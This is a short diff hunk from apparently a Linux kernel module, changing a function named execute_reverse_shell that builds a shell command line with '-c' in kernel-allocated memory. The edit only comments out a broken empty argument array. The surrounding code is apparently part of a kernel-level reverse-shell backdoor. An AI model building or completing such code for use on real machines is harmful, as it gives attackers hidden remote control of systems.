@@ -25,7 +25,7 @@ void execute_reverse_shell(struct work_struct *work){
     
     char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
     memset(exec, 0, sizeof(char) * 256);
-    char *argv[] = {}
+    //char *argv[] = {};
     char *argv[] = {
                         SHELL,
                         "-c",
